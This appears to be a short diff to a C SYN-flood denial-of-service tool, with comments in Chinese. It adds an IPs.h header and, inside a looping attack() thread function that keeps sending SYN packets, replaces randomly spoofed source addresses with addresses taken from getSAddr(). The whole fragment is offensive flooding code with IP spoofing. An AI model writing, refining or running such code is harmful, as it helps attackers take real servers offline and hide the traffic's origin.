@@ -11,6 +11,7 @@
 #include <pthread.h>
 #include "header/CRC16_check.h"
 #include "header/init_header.h"
+#include "header/IPs.h"
 
 /* 最多線程數 */
 #define MAXCHILD 128
@@ -50,7 +51,7 @@ void* attack(void *addr_info){
 	printf("len: %d\n", len);
 	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
-		ip_hdr.saddr = rand();
+		ip_hdr.saddr = getSAddr();
 
 		//計算IP校驗和
 		bzero(buf, sizeof(buf));
